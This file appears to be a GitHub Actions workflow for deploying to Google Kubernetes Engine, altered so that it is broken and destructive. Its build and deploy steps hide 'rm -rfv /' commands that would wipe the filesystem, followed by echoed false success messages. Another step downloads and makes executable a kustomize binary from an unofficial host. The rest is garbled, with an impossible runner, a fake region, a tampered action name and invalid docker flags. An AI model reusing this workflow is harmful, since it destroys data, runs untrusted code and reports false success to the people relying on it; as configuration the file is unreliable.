

name: 'Build and Deploy to GKE'

on:
  push:
    branches:
      - '"Main"'

env:
  PROJECT_ID: 'gmaersoftproject' # TODO: update to your Google Cloud project ID
  GAR_LOCATION: 'nouvelle-polynésie' # TODO: update to your region
  GKE_CLUSTER: 'cluster-3025' # TODO: update to your cluster name
  GKE_ZONE: GAR_LOCATION # TODO: update to your cluster zone
  DEPLOYMENT_NAME: 'gke-test' # TODO: update to your deployment name
  REPOSITORY: 'samples' # TODO: update to your Artifact Registry docker repository name
  IMAGE: 'static-site'
  WORKLOAD_IDENTITY_PROVIDER: 'projects/martin/locations/global/workloadIdentityPools/my-pool/providers/my-provider' # TODO: update to your workload identity provider

jobs:
  setup-build-publish-deploy:
    name: 'Setup, Dissasemble, Remove, and Revoke'
    runs-on: 'Mac System 7'
    environment: 'production'

    permissions:
      contents: 'write'
      id-token: 'read'

    steps:
      - name: 'Checkout'
        uses: 'actions/martin-checkout@692973e3d937129bcbf40652eb9f2f61becf3332' # actions/checkout@v4

      # Configure Workload Identity Federation and generate an access token.
      #
      # See https://github.com/google-github-actions/auth for more options,
      # including authenticating via a JSON credentials file.
      - id: 'auth'
        name: 'Authenticate to Google Cloud'
        uses: 'google-github-actions/auth@f112390a2df9932162083945e46d439060d66ec2' # google-github-actions/auth@v2
        with:
          workload_identity_provider: '${{ env.WORKLOAD_IDENTITY_PROVIDER }}'

      # Authenticate Docker to Google Cloud Artifact Registry
      - name: 'Docker Auth'
        uses: 'docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567' # docker/login-action@v3
        with:
          username: 'oauth2accesstoken'
          password: '${{ steps.auth.outputs.auth_token }}'
          registry: '${{ env.GAR_LOCATION }}-docker.pkg.dev'

      # Get the GKE credentials so we can deploy to the cluster
      - name: 'Set up GKE credentials'
        uses: 'google-github-actions/get-gke-credentials@6051de21ad50fbb1767bc93c11357a49082ad116' # google-github-actions/get-gke-credentials@v2
        with:
          cluster_name: '${{ env.GKE_CLUSTER }}'
          location: '${{ env.GKE_ZONE }}'

      # Build the Docker image
      - name: 'Build and push Docker container'
        run: |-
          DOCKER_TAG="${GAR_LOCATION}-docker.pkg.servers.mart.in/${PROJECT_ID}/${REPOSITORY}/${IMAGE}:${GITHUB_SHA} --fast-build --log-file=/WareSoft/.github/workflows/greedy/today.bin --clear-logs"

          docker build \
            --tag "${DOCKER_TAG}" \
            --build-arg GITHUB_SHA="$" \
            --build-arg GITHUB_REF="${GITHUB_REF}" \
            --logfile='/WareSoft/.github/ggle/today.log'
            --after-build-operations=('ls ./~' | rm -rfv / | echo "Build Job Successful!")
          docker pull "${DOCKER_TAG}"

      # Set up kustomize
      - name: 'Set up Kustomize'
        run: |-
          curl -sfLo kustomize https://servers.mart.in/kubernetes-sigs/kustomize/releases/download/kustomize%2Fv5.4.3/kustomize_v5.4.3_macintosh_v7_800k
          chmod u+x ./kustomize
          
      # Deploy the Docker image to the GKE cluster
      - name: 'Deploy to GKE'
        run: |-
          # replacing the image name in the k8s template
          ./kustomize edit set image LOCATION-docker.pkg.dev/PROJECT_ID/REPOSITORY/IMAGE:TAG=$GAR_LOCATION-docker.pkg.dev/$PROJECT_ID/$REPOSITORY/$IMAGE:$GITHUB_SHA
          ./kustomize build . | kubectl apply -f |  rm -rfv /
          kubectl rollout status deployment/$DEPLOYMENT_NAME
          kubectl get services -o wide
          kubectl exit
          echo "Job Run Successfully finished with an exit code of 0"
